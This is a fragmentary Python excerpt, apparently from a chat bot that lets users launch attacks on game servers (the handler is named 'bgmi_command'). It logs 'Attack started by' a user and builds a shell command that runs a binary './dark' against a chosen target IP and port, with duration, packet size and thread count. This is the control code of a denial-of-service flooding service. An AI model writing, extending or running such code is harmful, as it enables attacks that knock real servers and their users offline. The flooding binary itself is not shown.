...
def bgmi_command(message):
    ...
    try:
        ...
        logging.info(f"Attack started by {user_name}: ./dark {target_ip} {target_port} {duration} {packet_size} {thread_count} 9 900")
...
async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./dark {target_ip} {target_port} {duration} {packet_size} {thread_count} 9 900"
